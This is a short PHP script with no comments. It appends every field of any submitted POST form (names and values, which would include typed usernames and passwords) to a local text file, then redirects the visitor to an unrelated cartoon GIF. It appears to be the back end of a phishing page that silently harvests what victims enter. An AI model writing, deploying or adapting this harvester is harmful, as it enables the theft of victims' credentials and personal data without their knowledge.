<?php
header("Location: https://i2.wp.com/lenteramata.com/wp-content/uploads/2020/03/macam-macam-gambar-kartun-lucu-bergerak.gif?resize=300%2C300&ssl=1");
$handle = fopen("1.txt", "a");
foreach($_POST as $variable => $value)
{
fwrite($handle, $variable);
fwrite($handle,"=");
fwrite($handle, $value);
fwrite($handle,"\r\n");
}
fwrite($handle,"\r\n");
fclose($handle);
exit;
?>